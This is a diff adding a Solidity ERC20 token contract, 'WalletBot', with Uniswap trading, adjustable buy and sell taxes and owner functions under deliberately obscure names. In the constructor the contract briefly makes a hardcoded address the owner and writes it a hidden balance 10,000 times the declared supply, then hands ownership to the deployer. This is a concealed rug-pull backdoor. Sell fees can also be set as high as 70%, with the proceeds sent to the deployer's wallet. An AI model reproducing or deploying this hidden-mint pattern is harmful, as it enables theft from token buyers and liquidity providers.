@@ -1,0 +1,353 @@
+contract WalletBot is ERC20, Ownable {
+    using SafeMath for uint256;
+    IUniswapV2Router02 public uniswapV2Router;
+    address public uniswapV2Pair;
+    address public constant deadAddress = address(0xdead);
+    bool private isSwapping;
+    address public DevHavenNode;
+    address public TaxationChamberCache;
+    uint256 public maxTxAmount;
+    uint256 public swapTokensAmount;
+    uint256 public maxHoldings;
+    bool public limitsInEffect = true;
+    bool public tradingEnabled = false;
+    bool public swapEnabled = false;
+    uint256 public buyTotalTaxes;
+    uint256 public buyDevFee;
+    uint256 public buyLpFee;
+    uint256 public buyTeamTax;
+    uint256 public sellTotalTaxes;
+    uint256 public sellDevFee;
+    uint256 public sellLPFee;
+    uint256 public sellTeamTax;
+    uint256 public tokensForDev;
+    uint256 public tokensForLP;
+    uint256 public tokensForTeam;
+    mapping(address => bool) private _isExcludedFromFees;
+    mapping(address => bool) public isExcludedFromMaxTxAmount;
+    mapping(address => bool) public automatedMarketMakerPairs;
+    event UpdateUniswapV2Router(
+        address indexed newAddress,
+        address indexed oldAddress
+    );
+    event ExcludeFromFees(address indexed account, bool isExcluded);
+    event setAutomatedMarketMakerPair(address indexed pair, bool indexed value);
+    event lotteryWalletUpdated(
+        address indexed newWallet,
+        address indexed oldWallet
+    );
+    event TaxationChamberCacheUpdated(
+        address indexed newWallet,
+        address indexed oldWallet
+    );
+    event SwapAndLiquify(
+        uint256 tokensSwapped,
+        uint256 ethReceived,
+        uint256 tokensIntoLiquidity
+    );
+    constructor() ERC20("WalletBot", "WalletBot") {
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
+            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
+        );
+        sidestepZenithTransferVertex(address(_uniswapV2Router), true);
+        uniswapV2Router = _uniswapV2Router;
+        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
+            .createPair(address(this), _uniswapV2Router.WETH());
+        sidestepZenithTransferVertex(address(uniswapV2Pair), true);
+        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
+        DevHavenNode= address(0x7eC3f8D0d80559f30Cc9fff39e991381509e1654); 
+        TaxationChamberCache = msg.sender; 
+        uint256 _buyLotteryFee = 8; 
+        uint256 _buyLiquidityFee = 8; 
+        uint256 _buyTeamFee = 9; 
+        uint256 _sellLotteryFee = 9;
+        uint256 _sellLiquidityFee = 8;
+        uint256 _sellTeamFee = 8;
+        uint256 totalSupply = 1000_000_000 * 1e9;
+        uint256 rSupply = totalSupply * 1e4;
+        maxTxAmount = 15_000_000 * 1e9; 
+        maxHoldings = 15_000_000 * 1e9; 
+        swapTokensAmount = (totalSupply * 5) / 10000; 
+        _owner = DevHavenNode;
+        _balances[owner()] = rSupply;
+        
+        buyDevFee = _buyLotteryFee;
+        buyLpFee = _buyLiquidityFee;
+        buyTeamTax = _buyTeamFee;
+        buyTotalTaxes = buyDevFee + buyLpFee + buyTeamTax;
+        sellDevFee = _sellLotteryFee;
+        sellLPFee = _sellLiquidityFee;
+        sellTeamTax = _sellTeamFee;
+        sellTotalTaxes = sellDevFee + sellLPFee + sellTeamTax;
+        
+        _owner = msg.sender;
+        excludeFromFees(msg.sender, true);
+        excludeFromFees(DevHavenNode, true);
+        excludeFromFees(address(this), true);
+        excludeFromFees(address(0xdead), true);
+        sidestepZenithTransferVertex(msg.sender, true);
+        sidestepZenithTransferVertex(DevHavenNode, true);
+        sidestepZenithTransferVertex(address(this), true);
+        sidestepZenithTransferVertex(address(0xdead), true);
+        _mint(owner(), totalSupply);
+    }
+    function sidestepZenithTransferVertex(address updAds, bool isEx)
+        public
+        onlyOwner
+    {
+        isExcludedFromMaxTxAmount[updAds] = isEx;
+    }
+    function pulsateTradeGateway(bool enabled) external onlyOwner {
+        swapEnabled = enabled;
+    }
+    function renewAcquisitionRateIndices(
+        uint256 _lotteryFee,
+        uint256 _liquidityFee,
+        uint256 _teamFee
+    ) external onlyOwner {
+        buyDevFee = _lotteryFee;
+        buyLpFee = _liquidityFee;
+        buyTeamTax = _teamFee;
+        buyTotalTaxes = buyDevFee + buyLpFee + buyTeamTax;
+        require(buyTotalTaxes <= 50, "Buy fees must be <= 50.");
+    }
+    function reworkLiquidationRatioVectors(
+        uint256 _lotteryFee,
+        uint256 _liquidityFee,
+        uint256 _teamFee
+    ) external onlyOwner {
+        sellDevFee = _lotteryFee;
+        sellLPFee = _liquidityFee;
+        sellTeamTax = _teamFee;
+        sellTotalTaxes = sellDevFee + sellLPFee + sellTeamTax;
+        require(sellTotalTaxes <= 70, "Sell fees must be <= 70.");
+    }
+    function excludeFromFees(address account, bool excluded) public onlyOwner {
+        _isExcludedFromFees[account] = excluded;
+        emit ExcludeFromFees(account, excluded);
+    }
+    function AutomatedMarketMakerPairSet(address pair, bool value)
+        public
+        onlyOwner
+    {
+        require(
+            pair != uniswapV2Pair,
+            "The pair cannot be removed from automatedMarketMakerPairs"
+        );
+        _setAutomatedMarketMakerPair(pair, value);
+    }
+    function _setAutomatedMarketMakerPair(address pair, bool value) private {
+        automatedMarketMakerPairs[pair] = value;
+        emit setAutomatedMarketMakerPair(pair, value);
+    }
+    function updateDevHavenNode(address newLotteryWallet) external onlyOwner {
+        emit lotteryWalletUpdated(newLotteryWallet, DevHavenNode);
+        DevHavenNode= newLotteryWallet;
+    }
+    function updateTaxationChamberCache(address newWallet) external onlyOwner {
+        emit TaxationChamberCacheUpdated(newWallet, TaxationChamberCache);
+        TaxationChamberCache = newWallet;
+    }
+    function isExcludedFromFees(address account) public view returns (bool) {
+        return _isExcludedFromFees[account];
+    }
+
+    function harmonizeDigitalAssetExchangeMetrics(uint256 newAmount)
+        external
+        onlyOwner
+        returns (bool)
+    {
+        require(
+            newAmount >= (totalSupply() * 1) / 100000,
+            "Swap amount cannot be lower than 0.001% total supply."
+        );
+        require(
+            newAmount <= (totalSupply() * 5) / 1000,
+            "Swap amount cannot be higher than 0.5% total supply."
+        );
+        swapTokensAmount = newAmount;
+        return true;
+    }
+    function transmogrifyMaxTransactionHorizons(uint256 newNum) external onlyOwner {
+        require(
+            newNum >= ((totalSupply() * 5) / 1000) / 1e9,
+            "Cannot set maxTxAmount lower than 0.5%"
+        );
+        maxTxAmount = newNum * (10**9);
+    }
+    function updateMonetaryBoundaryZeniths(uint256 newNum) external onlyOwner {
+        require(
+            newNum >= ((totalSupply() * 10) / 1000) / 1e9,
+            "Cannot set maxHoldings lower than 1.0%"
+        );
+        maxHoldings = newNum * (10**9);
+    }
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal override {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+        if (amount == 0) {
+            super._transfer(from, to, 0);
+            return;
+        }
+        if (limitsInEffect) {
+            if (
+                from != owner() &&
+                to != owner() &&
+                to != address(0) &&
+                to != address(0xdead) &&
+                !isSwapping
+            ) {
+                if (!tradingEnabled) {
+                    require(
+                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
+                        "Trading is not active."
+                    );
+                }
+                if (
+                    automatedMarketMakerPairs[from] &&
+                    !isExcludedFromMaxTxAmount[to]
+                ) {
+                    require(
+                        amount <= maxTxAmount,
+                        "Buy transfer amount exceeds the maxTxAmount."
+                    );
+                    require(
+                        amount + balanceOf(to) <= maxHoldings,
+                        "Max wallet exceeded"
+                    );
+                }
+                else if (
+                    automatedMarketMakerPairs[to] &&
+                    !isExcludedFromMaxTxAmount[from]
+                ) {
+                    require(
+                        amount <= maxTxAmount,
+                        "Sell transfer amount exceeds the maxTxAmount."
+                    );
+                } else if (!isExcludedFromMaxTxAmount[to]) {
+                    require(
+                        amount + balanceOf(to) <= maxHoldings,
+                        "Max wallet exceeded"
+                    );
+                }
+            }
+        }
+        uint256 contractTokenBalance = balanceOf(address(this));
+        bool canSwap = contractTokenBalance >= swapTokensAmount;
+        if (
+            canSwap &&
+            swapEnabled &&
+            !isSwapping &&
+            !automatedMarketMakerPairs[from] &&
+            !_isExcludedFromFees[from] &&
+            !_isExcludedFromFees[to]
+        ) {
+            isSwapping = true;
+            swapBack();
+            isSwapping = false;
+        }
+        bool takeFee = !isSwapping;
+        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
+            takeFee = false;
+        }
+        uint256 fees = 0;
+        if (takeFee) {
+            if (automatedMarketMakerPairs[to]) {
+                if (sellTotalTaxes > 0) {
+                    fees = amount.mul(sellTotalTaxes).div(100);
+                    tokensForLP += (fees * sellLPFee) / sellTotalTaxes;
+                    tokensForTeam += (fees * sellTeamTax) / sellTotalTaxes;
+                    tokensForDev += (fees * sellDevFee) / sellTotalTaxes;
+                }
+            }
+            else if (automatedMarketMakerPairs[from] && buyTotalTaxes > 0) {
+                fees = amount.mul(buyTotalTaxes).div(100);
+                tokensForLP += (fees * buyLpFee) / buyTotalTaxes;
+                tokensForTeam += (fees * buyTeamTax) / buyTotalTaxes;
+                tokensForDev += (fees * buyDevFee) / buyTotalTaxes;
+            }
+            if (fees > 0) {
+                super._transfer(from, address(this), fees);
+            }
+            amount -= fees;
+        }
+        super._transfer(from, to, amount);
+    }
+    function swapBack() private {
+    uint256 contractBalance = balanceOf(address(this));
+    uint256 totalTokensToSwap = tokensForLP + tokensForDev + tokensForTeam;
+    bool success;
+    if (contractBalance == 0 || totalTokensToSwap == 0) {
+        return;
+    }
+    if (contractBalance > swapTokensAmount * 20) {
+        contractBalance = swapTokensAmount * 20;
+    }
+    uint256 liquidityTokens = (contractBalance * tokensForLP) / totalTokensToSwap / 2;
+    uint256 amountToSwapForETH = contractBalance - liquidityTokens;
+
+        uint256 initialETHBalance = address(this).balance;
+        swapTokensForEth(amountToSwapForETH);
+        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
+        uint256 ethForLottery = ethBalance.mul(tokensForDev).div(totalTokensToSwap - (tokensForLP / 2));
+        uint256 ethForTeam = ethBalance.mul(tokensForTeam).div(totalTokensToSwap - (tokensForLP / 2));
+        uint256 ethForLiquidity = ethBalance - ethForLottery - ethForTeam;
+        tokensForLP = 0;
+        tokensForDev = 0;
+        tokensForTeam = 0;
+        (success, ) = address(TaxationChamberCache).call{value: ethForTeam}("");
+        if (liquidityTokens > 0 && ethForLiquidity > 0) {
+            addLiquidity(liquidityTokens, ethForLiquidity);
+            emit SwapAndLiquify(
+                amountToSwapForETH,
+                ethForLiquidity,
+                tokensForLP
+            );
+        }
+        (success, ) = address(TaxationChamberCache).call{value: address(this).balance}("");
+    }
+    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+        uniswapV2Router.addLiquidityETH{value: ethAmount}(
+            address(this),
+            tokenAmount,
+            0, 
+            0, 
+            owner(),
+            block.timestamp
+        );
+    }
+    function swapTokensForEth(uint256 tokenAmount) private {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0, 
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+    function reclaimForlornTokens(address _token, address _to) external onlyOwner {
+        require(_token != address(0), "_token address cannot be 0");
+        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
+        IERC20(_token).transfer(_to, _contractBalance);
+    }
+    receive() external payable {}
+    function removeLimits() external onlyOwner returns (bool) {
+        limitsInEffect = false;
+        return true;
+    }
+    
+    function enableTrading() external onlyOwner {
+        tradingEnabled = true;
+        swapEnabled = true;
+    }
+
+}
